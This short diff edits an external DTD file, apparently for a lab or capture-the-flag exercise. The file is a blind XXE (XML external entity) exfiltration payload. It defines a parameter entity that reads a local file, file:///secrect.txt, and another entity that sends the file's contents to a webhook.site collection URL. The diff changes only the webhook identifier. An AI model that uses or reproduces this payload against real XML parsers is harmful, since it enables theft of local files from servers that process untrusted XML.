@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///secrect.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/b3d5e62c-44bf-44bd-ab38-6608b8cb515a/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/f5c4cbfd-d596-4bfe-b4af-a3e3be112f22/?x=%file;'>">
 %eval;
 %exfiltrate;
